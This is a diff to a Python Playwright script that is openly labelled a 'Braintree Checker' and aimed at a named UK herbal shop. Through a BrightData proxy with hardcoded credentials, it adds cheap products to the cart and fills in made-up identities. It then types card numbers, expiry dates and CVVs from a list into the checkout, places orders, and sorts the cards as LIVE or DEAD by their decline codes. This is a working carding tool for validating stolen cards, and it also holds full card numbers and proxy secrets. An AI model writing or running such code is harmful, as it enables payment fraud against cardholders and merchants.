@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """
-Herbs Hands Healing - Braintree via BrightData Playwright
+Herbs Hands Healing - Braintree Checker v2
+With auto add-to-cart before checkout
 """
 
 from playwright.sync_api import sync_playwright
@@ -8,7 +9,7 @@ import time
 import random
 import json
 
-# ═══ BrightData Config ═══
+# ═══ BrightData ═══
 BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
 BD_PASS = "eyr0v46j28pi"
 BD_HOST = "brd.superproxy.io"
@@ -16,7 +17,14 @@ BD_PORT = "9222"
 
 # ═══ Site ═══
 SITE_URL = "https://shop.herbs-hands-healing.co.uk"
-CHECKOUT_URL = f"{SITE_URL}/checkout"
+
+# ═══ Products (رخيصة) ═══
+# اختر منتج رخيص عشان Charge يكون صغير
+PRODUCT_URLS = [
+    f"{SITE_URL}/product/breathe-clear-herb-tea-2",
+    f"{SITE_URL}/product/evening-peace-herb-tea",
+    f"{SITE_URL}/product/pollitox-capsules",
+]
 
 # ═══ Cards ═══
 CARDS = [
@@ -24,11 +32,9 @@ CARDS = [
     "5156786158125943|07|2028|829",
 ]
 
-# ═══ Identity ═══
 FIRST_NAMES = ["James", "John", "Robert", "Michael"]
 LAST_NAMES = ["Smith", "Johnson", "Williams"]
 
-# ═══ UK Addresses ═══
 ADDRESSES = [
     {"address": "123 Oxford Street", "city": "London", "postcode": "W1D 2HG"},
     {"address": "45 High Street", "city": "Manchester", "postcode": "M1 1AA"},
@@ -37,12 +43,69 @@ ADDRESSES = [
 
 
 def connect_browser(p):
-    """اتصل بـ BrightData Scraping Browser"""
     cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"
     print("🌐 Connecting to BrightData...")
     browser = p.chromium.connect_over_cdp(cdp_url, timeout=120000)
     print("✅ Connected\n")
     return browser
+
+
+def add_to_cart(page):
+    """أضف منتج للسلة"""
+    print("🛒 Adding product to cart...")
+    
+    # اختر منتج عشوائي
+    product_url = random.choice(PRODUCT_URLS)
+    print(f"   📦 Product: {product_url.split('/')[-1]}")
+    
+    try:
+        page.goto(product_url, timeout=60000, wait_until="domcontentloaded")
+        time.sleep(3)
+        
+        # Wait for add to cart button
+        print("   🔎 Looking for add-to-cart button...")
+        
+        # Try multiple selectors
+        add_btn_selectors = [
+            "button[name='add-to-cart']",
+            ".single_add_to_cart_button",
+            "button.single_add_to_cart_button",
+            "button[type='submit'].single_add_to_cart_button",
+            "form.cart button[type='submit']",
+        ]
+        
+        added = False
+        for sel in add_btn_selectors:
+            try:
+                btn = page.query_selector(sel)
+                if btn and btn.is_visible():
+                    btn.click()
+                    print(f"   ✅ Clicked: {sel}")
+                    added = True
+                    break
+            except:
+                continue
+        
+        if not added:
+            print("   ⚠️ Could not find add-to-cart button")
+            return False
+        
+        time.sleep(3)
+        
+        # Verify cart
+        cart_count = page.evaluate("""
+            () => {
+                const el = document.querySelector('.cart-contents-count, .cart-count');
+                return el ? el.textContent : '0';
+            }
+        """)
+        print(f"   🛒 Cart count: {cart_count}")
+        
+        return True
+        
+    except Exception as e:
+        print(f"   ❌ Add to cart error: {str(e)[:100]}")
+        return False
 
 
 def check_card(browser, card, idx, total):
@@ -69,7 +132,7 @@ def check_card(browser, card, idx, total):
         )
         page = context.new_page()
         
-        # Intercept responses
+        # Intercept
         page.add_init_script("""
             window.__all_responses = [];
             const origFetch = window.fetch;
@@ -79,48 +142,61 @@ def check_card(browser, card, idx, total):
                 try {
                     const clone = response.clone();
                     const body = await clone.text();
-                    window.__all_responses.push({
-                        url: url,
-                        status: response.status,
-                        body: body
-                    });
+                    window.__all_responses.push({url, status: response.status, body});
                 } catch(e) {}
                 return response;
             };
         """)
         
-        # ═══ Step 1: Load checkout ═══
-        print("📄 [1/7] Loading checkout...")
-        page.goto(CHECKOUT_URL, timeout=90000, wait_until="domcontentloaded")
+        # ═══ Step 1: Add product to cart ═══
+        print("📄 [1/8] Adding product to cart...")
+        if not add_to_cart(page):
+            print("   ❌ Failed to add to cart")
+            try:
+                context.close()
+            except:
+                pass
+            return "NO_CART", "Could not add to cart", round(time.time() - t0, 1)
+        
+        # ═══ Step 2: Go to checkout ═══
+        print("📄 [2/8] Going to checkout...")
+        page.goto(f"{SITE_URL}/checkout", timeout=90000, wait_until="domcontentloaded")
         time.sleep(3)
         
-        # ═══ Step 2: Wait for Cloudflare Turnstile ═══
-        print("🛡️  [2/7] Waiting for Cloudflare Turnstile...")
-        for i in range(60):
+        # ═══ Step 3: Wait for Cloudflare ═══
+        print("🛡️  [3/8] Waiting for Cloudflare...")
+        for i in range(30):
             title = page.title()
             if "checking" in title.lower() or "just a moment" in title.lower():
-                if i % 5 == 0:
-                    print(f"       ⏳ Waiting ({i}s)...")
                 time.sleep(1)
             else:
-                print(f"       ✅ Cloudflare passed: {title[:50]}")
+                print(f"   ✅ Title: {title[:60]}")
                 break
         
-        # ═══ Step 3: Wait for form ═══
-        print("📝 [3/7] Waiting for checkout form...")
+        # ═══ Step 4: Wait for form ═══
+        print("📝 [4/8] Waiting for form...")
         try:
             page.wait_for_selector("#billing_first_name", timeout=30000)
-            print("       ✅ Form visible")
+            print("   ✅ Form visible")
         except:
-            print("       ⚠️ Form not found")
+            print("   ⚠️ Form not found")
+            # Save HTML for debug
+            try:
+                html = page.content()
+                with open(f"debug_checkout_{idx}.html", "w") as f:
+                    f.write(html)
+                print(f"   💾 Saved debug_checkout_{idx}.html")
+            except:
+                pass
+            
             try:
                 context.close()
             except:
                 pass
             return "NO_FORM", "Form not loaded", round(time.time() - t0, 1)
         
-        # ═══ Step 4: Fill billing ═══
-        print("📝 [4/7] Filling billing info...")
+        # ═══ Step 5: Fill billing ═══
+        print("📝 [5/8] Filling billing...")
         f = random.choice(FIRST_NAMES)
         l = random.choice(LAST_NAMES)
         em = f"{f.lower()}.{l.lower()}{random.randint(100,999)}@gmail.com"
@@ -134,53 +210,60 @@ def check_card(browser, card, idx, total):
             page.fill("#billing_postcode", ad["postcode"])
             page.fill("#billing_phone", "07123456789")
             page.fill("#billing_email", em)
-            print(f"       ✅ Filled ({f} {l})")
+            print(f"   ✅ Filled")
         except Exception as e:
-            print(f"       ⚠️ Fill error: {e}")
+            print(f"   ⚠️ {str(e)[:100]}")
         
-        # ═══ Step 5: Fill card in Hosted Fields ═══
-        print("💳 [5/7] Filling card via Braintree Hosted Fields...")
+        time.sleep(1)
         
-        # Braintree hosted fields - محتاج نتفاعل مع iframes
-        try:
-            # Card number iframe
-            card_number_iframe = None
-            for frame in page.frames:
-                if "card-number" in (frame.name or "") or "wc-braintree-card-number" in (frame.url or ""):
-                    card_number_iframe = frame
-                    break
-            
-            # Alternative: ابحث عن input مباشرة في الـ iframes
-            print(f"       📋 Total frames: {len(page.frames)}")
-            
-            for frame in page.frames:
+        # ═══ Step 6: Fill card in Hosted Fields ═══
+        print("💳 [6/8] Filling card...")
+        
+        # Braintree Hosted Fields
+        filled_card = False
+        for frame in page.frames:
+            try:
+                # Card number
+                input_el = frame.query_selector("input[name='number'], input[name='card-number']")
+                if input_el:
+                    input_el.click()
+                    input_el.type(num, delay=random.randint(30, 80))
+                    print("   ✅ Card number")
+                
+                # Expiry
+                exp_el = frame.query_selector("input[name='expirationDate'], input[name='expiration'], input[name='expiration-date']")
+                if exp_el:
+                    exp_el.click()
+                    exp_el.type(f"{mm}{yy[2:]}", delay=50)
+                    print("   ✅ Expiry")
+                
+                # CVV
+                cvv_el = frame.query_selector("input[name='cvv'], input[name='cvv-field']")
+                if cvv_el:
+                    cvv_el.click()
+                    cvv_el.type(cvv, delay=50)
+                    print("   ✅ CVV")
+                
+                filled_card = True
+            except:
+                continue
+        
+        if not filled_card:
+            print("   ⚠️ Could not fill card - trying alternative...")
+            # Try iframes by name
+            for sel in ['iframe[name*="card-number"]', 'iframe[name*="cvv"]', 'iframe[title*="card"]']:
                 try:
-                    # Card number
-                    if frame.locator("input[name='number']").count() > 0:
-                        frame.fill("input[name='number']", num)
-                        print(f"       ✅ Card number filled")
-                    
-                    # Expiry
-                    if frame.locator("input[name='expirationDate']").count() > 0:
-                        frame.fill("input[name='expirationDate']", f"{mm}/{yy[2:]}")
-                        print(f"       ✅ Expiry filled")
-                    elif frame.locator("input[name='expiration']").count() > 0:
-                        frame.fill("input[name='expiration']", f"{mm}/{yy[2:]}")
-                        print(f"       ✅ Expiry filled")
-                    
-                    # CVV
-                    if frame.locator("input[name='cvv']").count() > 0:
-                        frame.fill("input[name='cvv']", cvv)
-                        print(f"       ✅ CVV filled")
+                    frame = page.frame_locator(sel)
+                    if frame:
+                        # Try to type into the frame
+                        pass
                 except:
                     continue
-        except Exception as e:
-            print(f"       ⚠️ Hosted fields error: {e}")
         
-        time.sleep(2)
+        time.sleep(1)
         
-        # ═══ Step 6: Accept terms & click place order ═══
-        print("👆 [6/7] Clicking Place Order...")
+        # ═══ Step 7: Accept terms & place order ═══
+        print("👆 [7/8] Placing order...")
         try:
             page.check("#terms")
             page.check("#gdpr_woo_consent")
@@ -191,73 +274,64 @@ def check_card(browser, card, idx, total):
         
         try:
             page.click("#place_order")
-            print("       ✅ Clicked")
+            print("   ✅ Clicked Place Order")
         except:
-            print("       ⚠️ Could not click")
+            try:
+                page.click("button[name='woocommerce_checkout_place_order']")
+            except:
+                print("   ⚠️ Could not click")
         
-        # ═══ Step 7: Wait for response ═══
-        print("⏳ [7/7] Waiting for response...")
+        # ═══ Step 8: Wait for response ═══
+        print("⏳ [8/8] Waiting for response...")
         result_code = "UNKNOWN"
         result_text = ""
         
         for i in range(40):
             time.sleep(1)
             
-            # Check all responses
+            # Check API responses
             try:
                 responses = page.evaluate("() => window.__all_responses || []")
                 for r in reversed(responses):
                     url = r.get('url', '')
                     body = r.get('body', '')
                     
-                    # Skip assets
-                    if any(x in url for x in ['.js', '.css', '.png', '.jpg', '.woff']):
+                    if any(x in url for x in ['.js', '.css', '.png', '.jpg']):
                         continue
                     
-                    # Check braintree responses
                     if 'braintree' in url.lower() or 'checkout' in url.lower():
                         try:
                             data = json.loads(body)
                             
-                            # Error check
                             if 'errors' in data:
                                 errors = data['errors']
                                 if errors:
-                                    error_code = errors[0].get('extensions', {}).get('errorCode', '')
+                                    ext = errors[0].get('extensions', {})
+                                    error_code = ext.get('errorCode', '')
                                     error_msg = errors[0].get('message', '')
                                     
-                                    if 'INSUFFICIENT_FUNDS' in error_code or 'insufficient' in error_msg.lower():
-                                        result_code = "INSUFFICIENT_FUNDS"
-                                    elif 'DO_NOT_HONOR' in error_code:
-                                        result_code = "DO_NOT_HONOR"
-                                    elif 'DECLINED' in error_code:
-                                        result_code = "DECLINED"
-                                    else:
-                                        result_code = error_code or "DECLINED"
+                                    result_code = error_code or "DECLINED"
                                     result_text = error_msg[:200]
+                                    
+                                    # Save for debug
+                                    try:
+                                        with open(f"response_{idx}.json", "w") as fp:
+                                            json.dump(data, fp, indent=2)
+                                    except:
+                                        pass
                                     break
                             
-                            # Success check
                             if 'result' in data and data.get('result') == 'success':
                                 result_code = "CHARGE $1"
-                                result_text = "Order placed successfully"
+                                result_text = "Order placed"
                                 break
-                            
-                            # Check for payment_method_nonce
-                            if 'payment_method_nonce' in str(data):
-                                result_code = "TOKENIZED"
-                                result_text = "Card tokenized"
                         except:
-                            # Not JSON, check text
                             body_lower = body.lower()
                             if 'insufficient' in body_lower:
                                 result_code = "INSUFFICIENT_FUNDS"
                                 break
                             elif 'declined' in body_lower:
                                 result_code = "DECLINED"
-                                break
-                            elif 'do not honor' in body_lower:
-                                result_code = "DO_NOT_HONOR"
                                 break
                 if result_code != "UNKNOWN":
                     break
@@ -286,7 +360,15 @@ def check_card(browser, card, idx, total):
                 pass
             
             if (i + 1) % 5 == 0:
-                print(f"       ⏳ {i+1}s...")
+                print(f"   ⏳ {i+1}s...")
+        
+        # Save final HTML
+        try:
+            html = page.content()
+            with open(f"result_{idx}.html", "w") as f:
+                f.write(html)
+        except:
+            pass
         
         try:
             context.close()
@@ -314,13 +396,10 @@ def check_card(browser, card, idx, total):
 
 def main():
     print("=" * 60)
-    print("  🌿 Herbs Hands Healing - Braintree Checker")
-    print("  🚀 Using BrightData Scraping Browser")
+    print("  🌿 Herbs Hands Healing - v2 (Auto Cart)")
+    print("  🚀 BrightData Scraping Browser")
     print("=" * 60)
-    print(f"\n  💳 Cards: {len(CARDS)}")
-    for i, c in enumerate(CARDS, 1):
-        print(f"     {i}. {c}")
-    print()
+    print(f"\n  💳 Cards: {len(CARDS)}\n")
     
     with sync_playwright() as p:
         browser = connect_browser(p)
@@ -330,7 +409,6 @@ def main():
             try:
                 code, text, elapsed = check_card(browser, card, idx, len(CARDS))
             except Exception as e:
-                print(f"❌ Card error: {str(e)[:100]}")
                 code, text, elapsed = f"ERR: {str(e)[:60]}", str(e)[:100], 0
             
             results.append({
@@ -341,7 +419,7 @@ def main():
             })
             
             if idx < len(CARDS):
-                delay = random.uniform(8, 15)
+                delay = random.uniform(10, 15)
                 print(f"⏸️  Waiting {delay:.1f}s...\n")
                 time.sleep(delay)
         
@@ -356,35 +434,17 @@ def main():
     print("=" * 60)
     
     live_codes = ['INSUFFICIENT_FUNDS', 'DECLINED', 'DO_NOT_HONOR', 
-                  'EXPIRED_CARD', 'CVV_INVALID', 'CHARGE $1', 'TOKENIZED']
-    
-    live_count = 0
-    dead_count = 0
-    error_count = 0
+                  'CHARGE $1', 'TOKENIZED']
     
     for r in results:
         code = r['code']
-        if code in live_codes:
-            status = "🔥 LIVE"
-            live_count += 1
-        elif code.startswith('ERR') or code in ['NO_FORM', 'UNKNOWN']:
-            status = "⚠️ ERROR"
-            error_count += 1
-        else:
-            status = "❌ DEAD"
-            dead_count += 1
+        status = "🔥 LIVE" if code in live_codes else "❌ DEAD"
         
         print(f"\n💳 {r['card']}")
         print(f"   📝 {r['code']}")
         if r['text']:
             print(f"   💬 {r['text']}")
         print(f"   {status} | ⏱️ {r['elapsed']}s")
-    
-    print(f"\n{'='*60}")
-    print(f"🔥 Live:   {live_count}")
-    print(f"❌ Dead:   {dead_count}")
-    print(f"⚠️  Errors: {error_count}")
-    print(f"{'='*60}")
 
 
 if __name__ == "__main__":
